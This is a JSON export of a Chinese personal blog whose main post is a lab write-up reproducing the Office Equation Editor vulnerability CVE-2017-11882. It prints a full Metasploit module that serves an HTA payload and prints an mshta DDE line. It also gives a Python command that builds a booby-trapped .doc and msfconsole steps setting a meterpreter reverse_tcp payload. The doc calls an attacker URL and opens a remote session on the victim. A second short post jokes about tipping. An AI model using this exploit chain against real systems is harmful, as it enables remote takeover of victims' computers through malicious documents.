{"meta":{"title":"Someone's blog","subtitle":"I think the above words are right.","description":"A blog that just got started","author":"maybe nobody","url":"http://yoursite.com"},"pages":[],"posts":[{"title":"cve-2017-11882漏洞的复现","slug":"cve—-2017-11882漏洞的复现","date":"2018-08-10T10:16:09.000Z","updated":"2018-08-10T12:54:12.190Z","comments":true,"path":"2018/08/10/cve—-2017-11882漏洞的复现/","link":"","permalink":"http://yoursite.com/2018/08/10/cve—-2017-11882漏洞的复现/","excerpt":"材料和工具简介","text":"材料和工具简介 metasploitMetasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程。团队合作，在Metasploit和综合报告提出了他们的发现。 在本实验中，我们主要利用的是它的渗透攻击模块。环境及漏洞介绍环境搭建搭建虚拟系统kali和win7在搭建好的windows7下面安装office2013漏洞产生原理介绍（2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄然修复了潜伏17年之久的Office远程代码执行漏洞（CVE-2017-11882）。该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。）漏洞出现在模块EQNEDT32.EXE中，该模块为公式编辑器，在Office的安装过程中被默认安装。该模块以OLE技术（Object Linking and Embedding，对象链接与嵌入）将公式嵌入在Office文档内。当插入和编辑数学公式时，EQNEDT32.EXE并不会被作为Office进程（如Word等）的子进程创建，而是以单独的进程形式存在。这就意味着对于WINWORD.EXE, EXCEL.EXE等Office进程的保护机制，无法阻止EQNEDT32.EXE这个进程被利用。 由于office漏洞存在模块对于输入的公式未作正确的处理，所以可以通过刻意构造的数据内容覆盖掉栈上的函数地址，从而劫持程序流程。漏洞复现1.下载POC代码保存在攻击机上PS_shell文件：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::HttpServer def initialize(info = &#123;&#125;) super(update_info(info, &apos;Name&apos; =&gt; &apos;Microsoft Office Payload Delivery&apos;, &apos;Description&apos; =&gt; %q&#123; This module generates an command to place within a word document, that when executed, will retrieve a HTA payload via HTTP from an web server. Currently have not figured out how to generate a doc. &#125;, &apos;License&apos; =&gt; MSF_LICENSE, &apos;Arch&apos; =&gt; ARCH_X86, &apos;Platform&apos; =&gt; &apos;win&apos;, &apos;Targets&apos; =&gt; [ [&apos;Automatic&apos;, &#123;&#125; ], ], &apos;DefaultTarget&apos; =&gt; 0, )) end def on_request_uri(cli, _request) print_status(&quot;Delivering payload&quot;) p = regenerate_payload(cli) data = Msf::Util::EXE.to_executable_fmt( framework, ARCH_X86, &apos;win&apos;, p.encoded, &apos;hta-psh&apos;, &#123; :arch =&gt; ARCH_X86, :platform =&gt; &apos;win &apos;&#125; ) send_response(cli, data, &apos;Content-Type&apos; =&gt; &apos;application/hta&apos;) end def primer url = get_uri print_status(&quot;Place the following DDE in an MS document:&quot;) print_line(&quot;mshta.exe \\&quot;#&#123;url&#125;\\&quot;&quot;) endend 2.验证office存在这个漏洞输入语句： cd 桌面python Command43b_CVE-2017-11882.py -c “cmd.exe /c calc.exe” -o calc.doc 生成文件 calc.doc 将文件复制到靶机并用office打开，可以弹出计算器 由于Office2016存在CVE-2017-11882漏洞，当打开特殊构造的word文件时，windows会执行其他动作。3.在Kali Linux上构造带有shell后门的word文件，并开启监听命令：(1).打开metasploi msfconsole (2).搜索自己下在的攻击模块(PS_shell.rb) search PS_shell (3).利用这个攻击模块 use ../PS_shell (4).设置payload(攻击载荷) set payload windows/meterpreter/reverse_tcp (5).设置lhost（攻击机的ip） set LHOST 1.1.1.1 (6).设置uripath set uripath 123 (7).执行 exploit (8).使用CVE-2017-11882.py模块，生成带有shell的doc文件 python Command43b_CVE-2017-11882.py -c “masat http://129.168.118.132:8080/123&quot; -o test.doc (9).在靶机上打开生成的文件在攻击机上会有响应 sessions (10).进入对话 sessions 1。 sessions 1 (11).复现成功，现在可以控制靶机就像这样： 靶机将关机： 参考链接：http://www.cnblogs.com/Hi-blog/p/7878054.htmlhttp://payloads.online/archivers/2017-11-22/1","categories":[{"name":"CVE系列","slug":"CVE系列","permalink":"http://yoursite.com/categories/CVE系列/"}],"tags":[{"name":"工程实践3","slug":"工程实践3","permalink":"http://yoursite.com/tags/工程实践3/"}]},{"title":"one","slug":"one","date":"2018-08-05T11:32:54.000Z","updated":"2018-08-07T04:15:54.004Z","comments":true,"path":"2018/08/05/one/","link":"","permalink":"http://yoursite.com/2018/08/05/one/","excerpt":"关于打赏","text":"关于打赏 感觉下面的打赏的那个图片不是很清晰哦我觉得大家都有发现哦很好奇可不可以打赏哦你是不是和我一样有疑问哦不如我们大家都试一试？你问我金额？哈哈哈其实我不需要 哈哈哈哈对了 你给了我多少？","categories":[{"name":"机（bai）灵（chi）系列","slug":"机（bai）灵（chi）系列","permalink":"http://yoursite.com/categories/机（bai）灵（chi）系列/"}],"tags":[{"name":"提前谢谢金主","slug":"提前谢谢金主","permalink":"http://yoursite.com/tags/提前谢谢金主/"}]}]}